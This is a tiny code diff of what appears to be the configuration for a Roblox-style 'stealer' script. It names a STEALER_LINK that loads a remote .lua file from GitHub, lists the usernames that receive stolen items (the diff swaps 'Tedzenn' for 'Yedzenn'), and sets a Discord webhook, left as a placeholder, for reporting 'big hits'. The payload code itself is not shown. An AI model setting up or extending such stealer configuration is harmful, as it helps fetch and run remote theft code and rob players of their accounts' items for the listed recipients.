@@ -1,9 +1,9 @@
 STEALER_LINK = 'https://raw.githubusercontent.com/Fedzen/script/refs/heads/main/.lua'
 
 Usernames = {
-    'Tedzenn',
-    'Tedzenn',
-    'Tedzenn',
+    'Yedzenn',
+    'Yedzenn',
+    'Yedzenn',
 }
 
 BigHitsWebhook = "https://discord.com/api/webhooks/x/x"
